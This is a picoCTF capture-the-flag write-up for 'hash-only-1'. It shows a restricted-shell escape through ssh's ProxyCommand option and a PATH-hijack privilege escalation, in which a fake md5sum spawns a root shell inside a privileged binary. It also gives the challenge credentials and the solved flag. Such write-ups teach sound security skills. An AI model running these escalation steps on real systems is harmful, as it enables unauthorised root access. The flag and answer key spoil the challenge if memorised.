# **picoCTF Write-Up: hash-only-1**  
**Challenge Author:** Junias Bonou  

---

## **Challenge Description**  
In this challenge, we are given access to a remote machine via SSH and a binary named `flaghasher`, which has sufficient privileges to read the content of the flag file located at `/root/flag.txt`. However, instead of giving us the flag directly, it only returns the **MD5 hash** of the flag’s content.  
Since reversing the MD5 hash to retrieve the original flag content is computationally infeasible, we need to find a way to exploit the system and directly access the flag.

---

### **Access Credentials:**  
We are provided with the following credentials to access the remote machine:  
- **SSH Command:**  
  ```bash  
  ssh ctf-player@shape-facility.picoctf.net -p 55082  
  ```
- **Password:**  
  ```bash  
  83dcefb7  
  ```
  
## **Step 1: Initial Analysis**  

### **Logging in to the System**  
After logging in using the provided SSH credentials, we are placed in a restricted shell with limited functionality.  
Many essential commands like `mkdir`, `nano`, and `sudo` are disabled, making it difficult to explore or exploit the system.  

### **Running the Binary**  
Let’s run the `flaghasher` binary to see what it does:  

```bash  
./flaghasher  
```
- **Output:**  
  ```bash  
  Computing the MD5 hash of /root/flag.txt....  
  4ad1331a4a8351cac43c8bea5fb5b27b  /root/flag.txt  
  ```
The binary only returns the MD5 hash of the flag, but we want to retrieve the actual content of /root/flag.txt.
Since reversing the MD5 hash is not a feasible option, we need to find another way to exploit the system.

## **Step 2: Bypassing the Restricted Shell**  

To bypass the restricted shell, we searched online for SSH privilege escalation techniques and found a useful resource: the GTFOBins GitHub page [GTFOBins SSH Exploit](https://gtfobins.github.io/gtfobins/ssh/), which lists common privilege escalation techniques.  
One technique allows us to spawn an interactive shell using SSH’s `ProxyCommand` option.  

### **Command to Bypass the Restricted Shell:**  
```bash  
ssh -o ProxyCommand=';sh 0<&2 1>&2' x  
```
This command gives us a less restricted shell with access to commands like mkdir, echo, and export.

## **Step 3: Analyzing the Binary**  

After gaining a better shell, we use the `strings` command to inspect the `flaghasher` binary and check for useful information:  

```bash  
strings ./flaghasher  
```
- **Relevant Output:**  
  ```bash  
   /bin/bash -c 'md5sum /root/flag.txt'  
  ```
VOLA! 🎉 We can see this vulnerabilities here!
### **Vulnerability Identified:**  
The binary uses the `system()` function to execute the `md5sum` command **without specifying its absolute path** (like `/usr/bin/md5sum`).  
This makes the binary potentially vulnerable to **environment variable hijacking**, where we can manipulate the `PATH` environment variable to force the binary to execute a **malicious version of `md5sum`** that we control.  

## **Step 4: Exploiting the Binary**  

We will exploit the binary using the following steps:  

### **1. Create a Custom Directory:**  
```bash  
mkdir /tmp/exploit  
```

### **2. Create a Malicious Script Named md5sum:**  
This script will spawn a root shell when executed.
```bash  
echo "/bin/sh" > /tmp/exploit/md5sum    
```

### **3. Make the Script Executable:**  
```bash  
chmod +x /tmp/exploit/md5sum     
```

### **4. Manipulate the PATH Environment Variable:**  
We add /tmp/exploit to the beginning of the PATH environment variable so that our malicious md5sum script is executed instead of the real md5sum
```bash  
export PATH="/tmp/exploit:$PATH"     
```

### **5. Run the Vulnerable Binary:**  
```bash  
./flaghasher       
```

## **Step 5: Retrieving the Flag**  

Now that we have **root access**, we can read the content of the flag file:  

```bash  
cat /root/flag.txt  
```

### **Flag:**  
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_54094e3e} 🎉

---

## **Note:**  
This same method works for the **hash-only-2** challenge as well, due to the similar vulnerability in that binary.  

---

## **Conclusion**  
In this challenge, we exploited a **path hijacking vulnerability** by manipulating the `PATH` environment variable and creating a **malicious version of `md5sum`**.  
This allowed us to bypass the intended restriction, spawn a **root shell**, and successfully retrieve the flag.  
